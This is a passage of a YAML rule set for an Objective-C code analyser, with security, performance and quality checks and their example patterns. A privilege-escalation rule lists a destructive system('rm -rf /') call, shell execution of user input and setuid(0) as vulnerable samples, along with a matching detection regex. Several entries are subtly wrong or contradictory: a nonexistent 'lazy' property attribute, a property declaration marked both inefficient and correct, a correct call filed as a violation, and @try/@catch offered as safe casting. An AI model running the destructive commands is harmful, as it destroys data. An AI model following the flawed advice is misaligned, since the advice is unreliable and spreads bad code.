recommendation: 'Implement thread-safe synchronization:

  - Use @synchronized for simple synchronization

  - Use NSLock/NSRecursiveLock for granular control

  - Use dispatch_barrier_async for synchronized writes

  - Use dispatch_sync for synchronized reads

  - Consider immutable objects for thread safety

  - Document thread-safety guarantees

  - Use atomic properties for simple properties

  - Test with ThreadSanitizer and race condition detectors

  '
cwe:
- CWE-362
mitigation: '@synchronized, NSLock, dispatch_barrier_async, atomic properties.'

---
id: objc-sec-015
name: Privilege Escalation Detection
category: Security
severity: High
description: Detect privilege escalation and insecure system operations
pattern: "(system|exec|fork|spawn|getuid|setuid|geteuid|seteuid|\n getgid|setgid|getegid|setegid|chmod|chown|sudo|elevated).*\n"
check_type: privilege
vulnerable_patterns:
- system(userCommand)
- execl("/bin/sh", userInput)
- setuid(0) // attempt to become root
- system("rm -rf /") // dangerous
safe_patterns:
- Task execution with checked parameters
- Limited user privileges for operations
- Capability-based security model
recommendation: 'Avoid privilege escalation vulnerabilities:

  - Never call system() with user input

  - Never use setuid/seteuid for privilege escalation

  - Run with least privilege principle

  - Drop privileges after operations

  - Implement capability-based security

  - Validate all shell commands

  - Use elevated privileges only when necessary

  '
cwe:
- CWE-250
- CWE-94
mitigation: Avoid system(), use least privilege, validate commands.

---
id: objc-perf-001
name: Autorelease Pool Management
category: Performance
severity: High
description: Detect inefficient autorelease pool usage causing memory spikes
pattern: "(@autoreleasepool|autorelease|NSAutoreleasePool|\n autoreleasingReferencingObjectAtIndex|drain).*\n"
check_type: autorelease_management
inefficient_patterns:
- for (int i = 0; i < 1000000; i++) { NSString *str = [NSString stringWithFormat:...]
  }
- // No @autoreleasepool in tight loops
- '[array enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) { NSString
  *s = [obj description] }]'
efficient_patterns:
- '@autoreleasepool { for (int i = 0; i < 1000000; i++) { NSString *str = ... } }'
- for (int i = 0; i < 1000000; i++) { @autoreleasepool { NSString *str = ... } }
- '[array enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) { @autoreleasepool
  { NSString *s = [obj description] } }]'
recommendation: 'Optimize autorelease pool usage:

  - Use @autoreleasepool in tight loops creating temporary objects

  - Drain autorelease pool in loops processing large collections

  - Move @autoreleasepool outside loop if possible

  - Use fast enumeration with autorelease pools

  - Consider using NSMutableString instead of string concatenation

  - Profile with Instruments to identify autorelease spikes

  - Use proper scoping for temporary objects

  '
mitigation: Add @autoreleasepool in tight loops and collection processing.

---
id: objc-perf-002
name: ARC Overhead Detection
category: Performance
severity: Medium
description: Detect excessive retain/release overhead in ARC-managed code
pattern: "(@property.*strong|@property.*copy|retain|release|\n __strong|__weak|__unsafe_unretained|copy|mutableCopy).*\n"
check_type: arc_overhead
inefficient_patterns:
- '@property (copy, nonatomic) NSString *string // string property'
- '@property (strong, nonatomic) NSArray *immutableArray // unnecessary strong'
- NSString *copy = [original copy] // in tight loop
efficient_patterns:
- '@property (nonatomic, copy) NSString *string // correct'
- '@property (strong, nonatomic) NSMutableArray *mutableArray'
- '@property (weak, nonatomic) id<MyDelegate> delegate // prevent cycles'
recommendation: 'Optimize ARC performance:

  - Use __weak for delegates and observers

  - Use __strong only for retained properties

  - Use __unsafe_unretained for performance-critical code with careful lifetime management

  - Avoid excessive copying of immutable objects

  - Use copy properties only for thread-safe immutable objects

  - Batch property updates to reduce retain/release pairs

  - Profile retain/release activity with Instruments

  - Use copy only when thread safety requires it

  '
mitigation: __weak for delegates, avoid unnecessary copy, profile with Instruments.

---
id: objc-perf-003
name: Collection Operation Inefficiency
category: Performance
severity: High
description: Detect inefficient collection operations (O(n) operations in loops)
pattern: "(NSArray|NSMutableArray|NSDictionary|NSMutableDictionary|NSSet|NSMutableSet|\n\
  \ enumerateObjectsUsingBlock|enumerateKeysAndObjectsUsingBlock|\n containsObject|indexOfObject|objectForKey|removeObjectForKey|\n\
  \ for.*in|addObject|removeObject|sortedArray).*\n"
check_type: collection_performance
inefficient_patterns:
- for (id obj in array) { if ([otherArray containsObject:obj]) { ... } } // O(n^2)
- for (id key in dict) { [mutableArray addObject:[dict objectForKey:key]] } // O(n)
- '[array sortedArrayUsingSelector:@selector(compare:)] // recreates array'
- while ([array containsObject:obj]) { [array removeObject:obj] } // O(n^2)
efficient_patterns:
- NSSet *otherSet = [NSSet setWithArray:otherArray]
- for (id obj in array) { if ([otherSet containsObject:obj]) { ... } } // O(n)
- '[array enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) { ... }]'
- '[mutableArray sortUsingSelector:@selector(compare:)] // sorts in-place'
recommendation: 'Optimize collection operations:

  - Use NSSet instead of NSArray for containsObject: checks

  - Convert arrays to sets for membership testing (O(1) vs O(n))

  - Use enumerateObjectsUsingBlock: instead of for loops (better memory)

  - Use sortUsingSelector: on mutable arrays (in-place vs copy)

  - Batch removals instead of removing one at a time

  - Use predicates for filtering NSArray

  - Pre-allocate collections with capacity when size known

  - Cache results of expensive operations (count, etc.)

  '
mitigation: Use NSSet for membership, batch operations, use predicates.

---
id: objc-perf-004
name: String Handling Inefficiency
category: Performance
severity: High
description: Detect inefficient string operations and concatenation
pattern: "(stringByAppendingString|stringByAppendingFormat|NSMutableString|\n stringByReplacingOccurrencesOfString|componentsSeparatedByString|\n\
  \ lowercaseString|uppercaseString|stringWithFormat).*\n"
check_type: string_performance
inefficient_patterns:
- NSString *result = @""; for (...) { result = [result stringByAppendingString:part]
  } // O(n^2)
- for (id obj in array) { str = [str stringByAppendingString:[obj description]] }
- '[string stringByReplacingOccurrencesOfString:@"a" withString:@"b"] // multiple
  times'
efficient_patterns:
- NSMutableString *result = [NSMutableString string]
- for (...) { [result appendString:part] } // O(n)
- '[result appendString:[NSString stringWithFormat:@"%d", value]]'
- '[mutableString replaceOccurrencesOfString:@"a" withString:@"b" options:0 range:NSMakeRange(0,
  [mutableString length])]'
recommendation: 'Optimize string operations:

  - Use NSMutableString for concatenation in loops

  - Use stringWithFormat: instead of multiple appends

  - Cache string properties (length, substring operations)

  - Use componentsSeparatedByString: vs manual parsing

  - Use regular expressions for complex replacements

  - Consider using NSScanner for parsing

  - Avoid repeated case conversions

  - Use string pooling for repeated strings

  '
mitigation: Use NSMutableString, cache operations, avoid loops with append.

---
id: objc-perf-005
name: Image Caching Strategy
category: Performance
severity: High
description: Detect missing or inefficient image caching mechanisms
pattern: "(UIImage|imageNamed|imageWithContentsOfFile|imageWithData|\n UIImageView|setImage|sd_setImageWithURL|drawInRect|\n\
  \ NSURLCache|URLCache|ImageCache).*\n"
check_type: image_caching
inefficient_patterns:
- UIImage *image = [UIImage imageWithContentsOfFile:path] // in cell display
- for (NSString *filename in filenames) { UIImage *img = [UIImage imageNamed:filename]
  }
- '[imageView setImage:[UIImage imageWithData:data]] // no caching'
- UIImage *image = [UIImage imageWithData:[NSData dataWithContentsOfURL:url]] // blocking
  main thread
efficient_patterns:
- UIImage *image = [UIImage imageNamed:@"cached"] // cached in bundle
- NSCache *imageCache; id cachedImage = [imageCache objectForKey:path]
- '[imageView sd_setImageWithURL:url placeholderImage:placeholder]'
- dispatch_async(dispatch_get_global_queue(...), ^{ UIImage *img = [UIImage imageWithData:data]
  })
recommendation: 'Implement efficient image caching:

  - Use NSCache for in-memory image caching

  - Implement disk caching for downloaded images

  - Use SDWebImage or similar for network image loading

  - Decode images off main thread

  - Resize images to view size before caching

  - Implement memory warnings handling (clearCache)

  - Use imageWithData: for temporary images only

  - Profile image memory with Instruments

  - Pre-load critical images

  '
mitigation: Use NSCache, SDWebImage, decode off main, resize before cache.

---
id: objc-perf-006
name: Lazy Loading and Initialization
category: Performance
severity: Medium
description: Detect missing lazy loading and initialization patterns
pattern: "(init|initWithFrame|awakeFromNib|viewDidLoad|layoutSubviews|\n dealloc|_|lazy|@synthesize).*\n"
check_type: lazy_loading
inefficient_patterns:
- '- (id)init { ... [self initializeExpensiveObject] ... } // initialize everything'
- UIView *view = [[UIView alloc] init]; view.hidden = YES // never shown
- viewDidLoad loads all views even if not visible
efficient_patterns:
- '- (MyObject *)expensiveObject { if (!_expensiveObject) { _expensiveObject = ...;
  } return _expensiveObject; }'
- '@property (nonatomic, lazy) MyObject *object'
- '- (void)viewDidLoad { // load visible views only }'
recommendation: 'Implement lazy loading and initialization:

  - Defer expensive initialization to first use

  - Create properties on demand with getter checks

  - Use lazy evaluation patterns

  - Load views only when needed (table cell configuration)

  - Defer network requests until visible

  - Implement lazy property initialization

  - Use lazy collections and data structures

  - Monitor initialization performance with Instruments

  '
mitigation: Defer expensive init, check before creation, lazy properties.

---
id: objc-perf-007
name: Memory Allocation Inefficiency
category: Performance
severity: Medium
description: Detect excessive memory allocations and inefficient allocation patterns
pattern: "(malloc|calloc|realloc|alloca|sizeof|NSMutableArray|NSMutableDictionary|\n\
  \ NSMutableString|new|alloc|copy|mutableCopy).*\n"
check_type: memory_allocation
inefficient_patterns:
- for (int i = 0; i < n; i++) { NSMutableArray *arr = [NSMutableArray array] }
- NSMutableArray *array = [[NSMutableArray alloc] init]; // without capacity
- '[array addObject:obj]; [array addObject:obj2]; // repeated grows'
efficient_patterns:
- NSMutableArray *array = [NSMutableArray arrayWithCapacity:expectedSize]
- NSMutableDictionary *dict = [NSMutableDictionary dictionaryWithCapacity:size]
- Reuse collection objects instead of recreating
recommendation: 'Optimize memory allocations:

  - Pre-allocate collections with capacity when size known

  - Reuse collection objects instead of creating new ones

  - Use object pooling for frequently allocated objects

  - Avoid excessive small allocations

  - Use immutable collections when possible (less memory overhead)

  - Profile allocations with Instruments (Allocations tool)

  - Monitor high-water memory mark

  '
mitigation: Pre-allocate with capacity, reuse objects, use object pooling.

---
id: objc-perf-008
name: Main Thread Blocking
category: Performance
severity: Critical
description: Detect blocking operations on main thread causing UI freezes
pattern: "(dispatch_get_main_queue|dispatchOnMainQueue|performSelectorOnMainThread|\n\
  \ dispatch_async.*main|dispatch_sync.*main|\n NSData.*URL|NSString.*URL|URLSession|dataTaskWithURL|\n\
  \ viewDidLoad|viewWillAppear|drawRect|layoutSubviews).*\n"
check_type: main_thread_blocking
inefficient_patterns:
- viewDidLoad { NSData *data = [NSData dataWithContentsOfURL:url] } // blocking network
- dispatch_sync(dispatch_get_main_queue(), ^{ ... }) // deadlock risk
- '[NSString stringWithContentsOfURL:url encoding:NSUTF8StringEncoding error:nil]
  // blocking'
- '- (void)drawRect:(CGRect)rect { [self loadDataFromDisk] }'
efficient_patterns:
- dispatch_async(dispatch_get_global_queue(...), ^{
- '  NSData *data = [NSData dataWithContentsOfURL:url]'
- '  dispatch_async(dispatch_get_main_queue(), ^{ [self updateUI:data] })'
- '})'
recommendation: 'Avoid blocking main thread:

  - Move network operations to background queue

  - Move file I/O to background queue

  - Move database operations to background queue

  - Use dispatch_async to avoid deadlocks

  - Profile with Main Thread Checker (Xcode)

  - Set os_log points to identify blocking operations

  - Use NSURLSession for network (built-in queue support)

  - Keep main thread for UI updates only

  '
mitigation: dispatch_async for background work, Main Thread Checker.

---
id: objc-perf-009
name: View Hierarchy Complexity
category: Performance
severity: Medium
description: Detect overly complex view hierarchies causing rendering issues
pattern: "(UIView|addSubview|insertSubview|UIStackView|\n layoutSubviews|drawRect|CALayer|cornerRadius|\n\
  \ masksToBounds|shadowPath|opacity).*\n"
check_type: view_hierarchy
inefficient_patterns:
- // Deeply nested view hierarchies (>10 levels)
- view.layer.cornerRadius = 50; view.layer.masksToBounds = YES // rasterizes
- view.layer.shadowPath = nil // expensive shadow
- '[superview addSubview:view] // in loop without batching'
efficient_patterns:
- UIStackView for layout (flattens hierarchy)
- view.layer.cornerRadius = 50 WITH view.layer.shadowPath = [UIBezierPath bezierPathWithRoundedRect:...]
- Use CADisplayLink for smooth animations
- 'Batch view creation: CATransaction { [superview addSubview:v] }'
recommendation: 'Optimize view hierarchies:

  - Keep view depth < 10 levels

  - Use UIStackView for dynamic layouts

  - Set shadowPath explicitly (not nil/null)

  - Use rasterization sparingly (disable when animating)

  - Batch view updates with CATransaction

  - Pre-render static content (image snapshots)

  - Use CADisplayLink for animation

  - Profile rendering with Core Animation tool

  '
mitigation: Flatten hierarchy, UIStackView, explicit shadowPath, CATransaction.

---
id: objc-perf-010
name: Scrolling Performance Issues
category: Performance
severity: High
description: Detect UITableView/UICollectionView scrolling performance problems
pattern: "(UITableViewCell|UICollectionViewCell|cellForRowAtIndexPath|\n cellForItemAtIndexPath|dequeueReusableCellWithIdentifier|\n\
  \ heightForRowAtIndexPath|estimatedHeightForRowAtIndexPath|\n scrollViewDidScroll|willDisplayCell).*\n"
check_type: scroll_performance
inefficient_patterns:
- '- (UITableViewCell *)tableView:(UITableView *)table cellForRowAtIndexPath:(NSIndexPath
  *)indexPath {'
- '  cell.imageView.image = [UIImage imageWithContentsOfFile:path] // main thread'
- '  cell.textLabel.text = [expensiveObject description]'
- '  return cell'
- '}'
- '- (CGFloat)tableView:(UITableView *)table heightForRowAtIndexPath:(NSIndexPath
  *)indexPath {'
- '  return [self calculateHeightForRow:indexPath] // expensive'
- '}'
efficient_patterns:
- '- (void)configureCell:(UITableViewCell *)cell forIndexPath:(NSIndexPath *)indexPath'
- '  cell.imageView.image = [self.imageCache objectForKey:indexPath]'
- '}'
- '- (CGFloat)tableView:(UITableView *)table estimatedHeightForRowAtIndexPath:(NSIndexPath
  *)indexPath'
- '  return 44.0 // estimated'
- '}'
recommendation: 'Optimize table/collection view scrolling:

  - Use estimatedHeightForRowAtIndexPath instead of exact height

  - Pre-calculate row heights and cache

  - Cache cell heights in NSIndexPath-indexed dictionary

  - Load images asynchronously

  - Avoid complex calculations in cellForRowAtIndexPath

  - Reuse cells properly (dequeueReusableCellWithIdentifier)

  - Pre-render complex cell content

  - Use shouldHighlightRowAtIndexPath to skip unnecessary work

  - Profile with Core Animation and Time Profiler

  '
mitigation: Use estimated heights, cache, async images, pre-render cells.

---
id: objc-perf-011
name: Database Query Inefficiency
category: Performance
severity: High
description: Detect inefficient Core Data/SQLite queries
pattern: "(NSFetchRequest|NSPredicate|NSFetchedResultsController|\n sqlite3_prepare|sqlite3_step|sqlite3_finalize|\n\
  \ fetchAllObjects|executeFetchRequest|NSManagedObjectContext).*\n"
check_type: database_performance
inefficient_patterns:
- NSFetchRequest *request = [NSFetchRequest fetchRequestWithEntityName:@"Entity"]
- '[context executeFetchRequest:request error:nil] // no predicate, fetches all'
- for (Entity *obj in results) { [obj.relationships count] } // faults loaded
- NSFetchRequest without batch size // loads all to memory
efficient_patterns:
- NSFetchRequest *request = [NSFetchRequest fetchRequestWithEntityName:@"Entity"]
- request.predicate = [NSPredicate predicateWithFormat:@"status = %@", @"active"]
- request.relationshipKeyPathsForPrefetching = @[@"related"]
- request.returnsObjectsAsFaults = NO
- request.fetchBatchSize = 100
recommendation: 'Optimize database queries:

  - Use predicates to filter early (server-side filtering)

  - Use relationshipKeyPathsForPrefetching for joins

  - Set appropriate fetchBatchSize (default 0 = all)

  - Use returnsObjectsAsFaults for efficiency

  - Index frequently queried columns

  - Use NSFetchedResultsController for table views

  - Avoid N+1 queries (faulting relationships)

  - Profile with Core Data debugging tools

  '
mitigation: Use predicates, prefetch, batch size, NSFetchedResultsController.

---
id: objc-perf-012
name: Regular Expression Performance
category: Performance
severity: Medium
description: Detect inefficient regular expression usage
pattern: "(NSRegularExpression|enumerateMatchesInString|\n NSRegularExpressionSearch|componentsSeparatedByRegex|\n\
  \ stringByMatching|stringByReplacingOccurrences).*\n"
check_type: regex_performance
inefficient_patterns:
- for (NSString *str in array) {
- '  NSRegularExpression *regex = [NSRegularExpression ... pattern:regexPattern ...]'
- '  [regex enumerateMatchesInString:str ...]'
- '} // regex compiled each time'
efficient_patterns:
- NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:pattern
  options:0 error:nil]
- for (NSString *str in array) {
- '  [regex enumerateMatchesInString:str ...]'
- '}'
recommendation: 'Optimize regular expression usage:

  - Cache compiled regex objects (not create per match)

  - Use NSRegularExpressionCaseInsensitive option for optimization

  - Use NSRegularExpressionAnchorsMatchLines for multiline

  - Consider simple string operations for basic patterns

  - Use NSScanner for simple parsing instead of regex

  - Profile regex performance on large strings

  - Consider precompiled/optimized patterns

  '
mitigation: Cache regex, compile once, reuse for multiple matches.

---
id: objc-perf-013
name: Animation Performance
category: Performance
severity: Medium
description: Detect inefficient animation implementations
pattern: "(UIView.*animateWithDuration|CABasicAnimation|CAKeyframeAnimation|\n CADisplayLink|CATransaction|[CATransaction\
  \ begin|[CATransaction commit|\n animationWithKeyPath|opacity|position|scale|cornerRadius).*\n"
check_type: animation_performance
inefficient_patterns:
- '[UIView animateWithDuration:0.3 animations:^{'
- '  for (int i = 0; i < 100; i++) {'
- '    view.alpha = 1.0 - (i / 100.0) // expensive'
- '  }'
- '}]'
efficient_patterns:
- CABasicAnimation *anim = [CABasicAnimation animationWithKeyPath:@"opacity"]
- anim.fromValue = @(1.0); anim.toValue = @(0.0)
- anim.duration = 0.3
- '[view.layer addAnimation:anim forKey:@"opacity"]'
recommendation: 'Optimize animations:

  - Use CABasicAnimation instead of block animations for smooth 60fps

  - Use CADisplayLink for complex animations

  - Avoid animating complex views (pre-render/snapshot)

  - Disable shadows and rounded corners during animation

  - Use CATransaction for batch animations

  - Profile with Core Animation and Time Profiler

  - Use shouldRasterize sparingly (disable after animation)

  '
mitigation: Use CABasicAnimation, CADisplayLink, disable effects during anim.

---
id: objc-perf-014
name: Framework Load Time Optimization
category: Performance
severity: Medium
description: Detect excessive framework loading and initialization overhead
pattern: "(didFinishLaunchingWithOptions|applicationDidBecomeActive|\n import|@import|Framework|dyld|DYLD_|launch|startup|load).*\n"
check_type: framework_loading
inefficient_patterns:
- // Importing many frameworks in main thread
- '[self initializeAllFrameworks] // in didFinishLaunching'
- dispatch_sync(mainQueue) // in framework init
efficient_patterns:
- Lazy load frameworks on first use
- Initialize non-critical frameworks on background
- Use modulemap for framework management
recommendation: 'Optimize framework loading:

  - Measure app launch time with Instruments

  - Lazy load frameworks on first use

  - Defer non-critical initialization

  - Profile with Time Profiler tool

  - Consider removing unused frameworks

  - Use dynamic linking for optional features

  '
mitigation: Lazy load, defer init, measure launch time with Instruments.

---
id: objc-qual-001
name: Apple Naming Conventions
category: Quality
severity: Medium
description: Enforce Apple-style naming conventions for classes, methods, properties
pattern: '(^[A-Z]|^[a-z].*:|method|property|variable|class|protocol).*

  '
check_type: naming_conventions
violations:
- class myClass { } // should be MyClass
- '@property NSString *strValue; // should be string'
- '- (void)GetValue { } // should be getValue (camelCase)'
- '@property String *str; // should be NSString'
- '- (void)PROCESS_DATA { } // should be processData'
correct_usage:
- class MyClass { } // PascalCase for classes
- '@property (nonatomic) NSString *string; // camelCase for properties'
- '- (void)getValue { } // camelCase for methods'
- '- (void)setName:(NSString *)name { } // setter with (void)'
- '- (BOOL)isEnabled { } // boolean with ''is'' prefix'
recommendation: 'Follow Apple naming conventions:

  - Classes: PascalCase (MyViewController, NSMutableArray)

  - Properties/variables: camelCase (firstName, isEnabled)

  - Methods: camelCase (getValue:, processData)

  - Constants: ALL_CAPS with K prefix (kMaxRetries, kPIValue)

  - Protocols: PascalCase with Delegate/DataSource suffix (MyDelegate)

  - Getters: getPropertyName: only for expensive operations

  - Setters: setPropertyName: or property = syntax

  - Booleans: is/has/should prefix (isEnabled, hasData, shouldRetry)

  - Prefixes: Use 2-3 letter class prefix to avoid conflicts

  '
mitigation: Use PascalCase for classes, camelCase for methods/properties.

---
id: objc-qual-002
name: Property Attributes
category: Quality
severity: High
description: Enforce proper property attribute declarations
pattern: "(@property|nonatomic|atomic|strong|weak|copy|assign|\n readonly|readwrite|getter|setter).*\n"
check_type: property_attributes
violations:
- '@property NSString *name; // missing nonatomic'
- '@property (strong) NSMutableArray *array; // redundant, default'
- '@property (retain) NSString *str; // use strong in ARC'
- '@property (assign) id delegate; // should use weak'
correct_usage:
- '@property (nonatomic, copy) NSString *name; // immutable'
- '@property (nonatomic, strong) NSMutableArray *array; // mutable'
- '@property (weak, nonatomic) id<MyDelegate> delegate; // break cycles'
- '@property (nonatomic, readonly) NSInteger identifier; // read-only'
- '@property (nonatomic, getter=isEnabled) BOOL enabled; // custom getter'
recommendation: 'Use correct property attributes:

  - nonatomic: almost always (atomic expensive, rarely needed)

  - strong: for owned objects (default in ARC)

  - weak: for delegates, observers, self-referential objects

  - copy: for immutable objects (NSString, NSArray, NSData)

  - assign: rarely (for primitives and weak non-ARC pointers)

  - readonly/readwrite: explicit when limiting access

  - getter/setter: custom accessors for special handling

  - Avoid atomic unless truly thread-safe required

  '
mitigation: Add nonatomic, use weak for delegates, copy for immutable.

---
id: objc-qual-003
name: Nullability Annotations
category: Quality
severity: High
description: Enforce nullability annotations for type safety
pattern: "(_Nullable|_Nonnull|nullable|nonnull|null_resettable|\n __nullable|__nonnull|__null_unspecified).*\n"
check_type: nullability
violations:
- '- (NSString *)getName { } // unclear if can return nil'
- '- (void)setName:(NSString *)name { } // can name be nil?'
- '@property NSArray *items; // unclear if mutable'
correct_usage:
- '- (nullable NSString *)getName { } // can return nil'
- '- (void)setName:(nonnull NSString *)name { } // name cannot be nil'
- '@property (nonnull) NSArray *items; // never nil'
- '- (nullable NSError **)error; // out parameter'
- '@property (nonnull, copy) NSString *identifier; // never nil, copy for safety'
recommendation: 'Add nullability annotations:

  - Use _Nonnull for parameters and properties that cannot be nil

  - Use _Nullable for return values and out parameters that can be nil

  - Use __null_unspecified for legacy code (migrate over time)

  - Use NS_ASSUME_NONNULL_BEGIN/END for bulk annotations

  - Annotate all public API headers

  - Enable warnings: -Wnullability-completeness

  - Document nil behavior in method comments

  '
mitigation: Add _Nonnull/_Nullable, use NS_ASSUME_NONNULL_BEGIN.

---
id: objc-qual-004
name: Memory Management Patterns
category: Quality
severity: High
description: Enforce proper ARC memory management patterns
pattern: "(dealloc|release|retain|autorelease|copy|strong|weak|\n __strong|__weak|NSZombieEnabled|MallocStackLogging).*\n"
check_type: memory_patterns
violations:
- // Missing dealloc for observer cleanup
- // Retaining self in block causing cycle
- '- (void)setupBlock { self.block = ^{ [self doSomething] } }'
- __strong Object *obj = strongRef; // unnecessary
correct_usage:
- '- (void)dealloc { [[NSNotificationCenter defaultCenter] removeObserver:self] }'
- __weak typeof(self) weakSelf = self; self.block = ^{ [weakSelf doSomething] }
- '@property (weak) id<MyDelegate> delegate; // no retain cycle'
- '@interface MyClass { NSMutableArray *_internal; }'
recommendation: 'Follow ARC memory management:

  - Use ARC exclusively (no manual retain/release)

  - Use __weak in blocks to break retain cycles

  - Implement dealloc for cleanup (observers, timers, etc.)

  - Use __strong only when explicitly needed

  - Document retain cycle risks in comments

  - Test with Leaks and Allocations instruments

  - Use Weak/Strong Dance pattern: weakSelf/strongSelf in blocks

  - Avoid circular references through delegates

  '
mitigation: __weak in blocks, dealloc for cleanup, no manual ARC.

---
id: objc-qual-005
name: Protocol Design
category: Quality
severity: Medium
description: Enforce proper protocol design and compliance
pattern: "(@protocol|@required|@optional|delegate|dataSource|\n conformsToProtocol|respondsToSelector).*\n"
check_type: protocol_design
violations:
- '@protocol MyProtocol // no methods (unclear intent)'
- '- (void)update; // vague, unclear parameters'
- '@protocol MyDelegate <NSObject> // missing NSCopying adoption'
- // Protocol mixing delegates and data source responsibilities
correct_usage:
- '@protocol MyDelegate <NSObject>'
- '@required'
- '- (void)updateWithData:(nonnull NSData *)data;'
- '@optional'
- '- (void)didFinishWithError:(nullable NSError *)error;'
- '@end'
recommendation: 'Design protocols properly:

  - Inherit from NSObject for compatibility

  - Separate delegates from data sources (single responsibility)

  - Use @required for mandatory methods

  - Use @optional for optional behavior (with respondsToSelector checks)

  - Document parameter meanings (especially NULL/nil cases)

  - Use nullability annotations in protocol declarations

  - Keep protocols focused and cohesive

  - Use protocol composition for complex requirements

  '
mitigation: Separate concerns, use @required/@optional, annotate nullability.

---
id: objc-qual-006
name: Error Handling Patterns
category: Quality
severity: High
description: Enforce proper error handling and exception use
pattern: "(@try|@catch|@finally|@throw|NSError|NSException|\n error:|completionHandler|resultHandler).*\n"
check_type: error_handling
violations:
- '- (NSString *)loadFile:(NSString *)path error:(NSError **)error {'
- '  [UIImage imageNamed:path] // ignores error, crashes on missing'
- '  return data'
- '}'
- '@try { ... } @catch (...) { } @finally { } // bare catches'
correct_usage:
- '- (nullable NSData *)loadFile:(nonnull NSString *)path error:(NSError * _Nullable
  *)error {'
- '  if (!path || !path.length) {'
- '    if (error) { *error = [NSError errorWithDomain:... code:... userInfo:...] }'
- '    return nil'
- '  }'
- '  return data'
- '}'
- '@try { ... } @catch (NSException *ex) { /* handle */ } @finally { /* cleanup */
  }'
recommendation: 'Implement proper error handling:

  - Use NSError for recoverable errors (not exceptions)

  - Use exceptions only for programming errors

  - Return nil with error pointer for failures

  - Validate error pointer before dereferencing (if (error) { *error = ... })

  - Use error domains and codes for categorization

  - Include NSUnderlyingError for error chains

  - Log errors but don''t expose to users

  - Provide recovery suggestions in userInfo

  - Use @try/@catch only for exception handling

  '
mitigation: Use NSError for failures, check error pointer, validate inputs.

---
id: objc-qual-007
name: Constants and Enums
category: Quality
severity: Medium
description: Enforce proper constant and enum declarations
pattern: "(const|NS_ENUM|NS_OPTIONS|typedef|#define|static|\n extern|kConstant|Constant).*\n"
check_type: constants_enums
violations:
- '#define kMaxRetries 5 // unsafe macro'
- static NSString *GlobalString = nil // mutable global
- enum Status { OK = 0, ERROR = 1 } // untyped enum
- extern int MAX_SIZE; // unsafe, should be const
correct_usage:
- static const NSInteger kMaxRetries = 5; // type-safe
- static NSString * const kErrorDomain = @"com.app.error"; // immutable
- typedef NS_ENUM(NSInteger, Status) { StatusOK = 0, StatusError = 1 }
- typedef NS_OPTIONS(NSUInteger, Permissions) { PermissionRead = 1, PermissionWrite
  = 2 }
- extern NSString * const kMyConstant; // in header
recommendation: 'Declare constants properly:

  - Use static const for primitive constants

  - Use extern for public constants (declare in header, define in implementation)

  - Use NS_ENUM for enumeration types

  - Use NS_OPTIONS for bitmask options

  - Avoid #define (use const instead)

  - Prefix constants with k (kMaxRetries, kAppName)

  - Use stringification for string constants

  - Document constant meanings and usage

  '
mitigation: Use NS_ENUM/NS_OPTIONS, static const, extern for public.

---
id: objc-qual-008
name: Method Signature Clarity
category: Quality
severity: Medium
description: Enforce clear and descriptive method signatures
pattern: '(^-|^\\+|\\(void\\)|\\(BOOL\\)|\\(id\\)|parameter|argument|return).*

  '
check_type: method_clarity
violations:
- '- (id)process { } // vague return type'
- '- (void)set:(id)value { } // unclear parameter'
- '- (void)doSomething:(NSString *)str other:(id)o { } // unclear'
- '- (NSString *)getValue { } // unclear what gets value'
correct_usage:
- '- (nullable id<MyDelegate>)delegate { return _delegate; }'
- '- (void)setValue:(nonnull id)value forKey:(nonnull NSString *)key { }'
- '- (void)updateWithData:(nonnull NSData *)data error:(NSError **)error { }'
- '- (nullable NSError *)validateWithOptions:(NSDictionary *)options { }'
recommendation: 'Write clear method signatures:

  - Use descriptive parameter names (user, not u)

  - Indicate parameter purpose with descriptive names

  - Use completion blocks for asynchronous results

  - Return values that indicate success/failure

  - Use error pointers for recoverable errors

  - Document complex parameter meanings

  - Keep signatures to 3-4 parameters maximum

  - Use factory methods for common initializations

  '
mitigation: Use descriptive names, clear parameters, error pointers.

---
id: objc-qual-009
name: Documentation Standards
category: Quality
severity: Medium
description: Enforce proper code documentation and comments
pattern: '(///|@param|@return|@throws|@warning|@deprecated|MARK|pragma).*

  '
check_type: documentation
violations:
- '- (void)complexMethod { } // no documentation'
- /**/ // incomplete documentation
- '@property NSString *data; // no comment explaining purpose'
correct_usage:
- /**
- ' * Processes the input data and returns the result.'
- ' *'
- ' * @param data The data to process.'
- ' * @return The processed result, or nil if processing fails.'
- ' * @warning This method blocks the calling thread.'
- ' */'
- '- (nullable id)processData:(nonnull NSData *)data;'
recommendation: 'Document code properly:

  - Add header comments for all public methods

  - Document parameters, return values, and exceptions

  - Use @param, @return, @throws style documentation

  - Add @warning for non-obvious behavior

  - Use @deprecated for obsolete methods

  - Add @see for related methods

  - Use // for inline explanations

  - Use #pragma mark for section organization

  - Document thread safety guarantees

  '
mitigation: Add documentation comments, use standard format, document warnings.

---
id: objc-qual-010
name: Type Safety and Casting
category: Quality
severity: High
description: Enforce type safety and proper object casting
pattern: '(id|NSObject|cast|as|typeof|isKindOfClass|isMemberOfClass).*

  '
check_type: type_safety
violations:
- NSString *str = (NSString *)obj; // unsafe cast
- if ([obj class] == [NSString class]) { } // direct class comparison
- '[array objectAtIndex:0]; // returns id, type unknown'
- NSObject *obj = ...; [obj doSomething]; // unknown method
correct_usage:
- if ([obj isKindOfClass:[NSString class]]) { NSString *str = (NSString *)obj; }
- '@try { NSString *str = (NSString *)obj; } @catch (...) { }'
- id result = array.firstObject; NSString *str = nil;
- if ([result isKindOfClass:[NSString class]]) { str = result; }
recommendation: 'Ensure type safety:

  - Check type with isKindOfClass: before casting

  - Use respondsToSelector: for dynamic method calls

  - Avoid unsafe casts (use if statements with checks)

  - Use generic collections (NSArray<NSString *> *)

  - Document expected types in comments

  - Use explicit type annotations

  - Use -Wstrict-selector-match for selector checking

  '
mitigation: Check type before casting, use generics, respondsToSelector:.

---
id: objc-qual-011
name: Initialization Patterns
category: Quality
severity: Medium
description: Enforce proper initialization and designated initializers
pattern: '(init|initWith|new|alloc|designated|initializer).*

  '
check_type: initialization
violations:
- '- (id)init { return [super init]; } // incomplete init'
- // Multiple init methods without designated pattern
- '[[MyClass alloc] init] // correct usage'
- '- (id)initWithValue:(id)val { self.value = val; return self; }'
correct_usage:
- '- (instancetype)initWithValue:(nonnull id)value {'
- '  self = [super init];'
- '  if (!self) return nil;'
- '  _value = value;'
- '  return self;'
- '}'
